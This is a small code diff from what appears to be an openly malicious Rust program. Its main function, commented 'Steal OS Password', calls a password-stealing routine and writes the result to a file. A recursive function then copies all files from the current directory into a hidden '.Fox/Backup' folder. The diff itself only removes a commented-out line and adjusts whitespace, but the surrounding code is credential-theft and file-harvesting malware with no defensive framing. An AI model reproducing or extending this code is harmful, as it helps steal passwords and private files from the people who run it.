@@ -35,8 +35,6 @@ fn main() {
     //Steal OS Password
     write!(file_name_os, "{}", steal_os_pas(file_os_password)).expect("Error! Unable to write file.\n");
 
-    //Create BackUP Folder
-    //fs::create_dir_all(".Fox/BackUP").expect("Error! Folder exist.\n");
     take_backup_files(".", ".Fox/Backup");
 }
 
@@ -64,7 +62,7 @@ fn take_backup_files(source: impl AsRef<Path>, dst: impl AsRef<Path>) -> io::Res
         let ty = entry.file_type()?;
         if ty.is_dir() {
             take_backup_files(entry.path(), dst.as_ref().join(entry.file_name()))?;
-        } 
+        }
         else {
             fs::copy(entry.path(), dst.as_ref().join(entry.file_name()))?;
         }
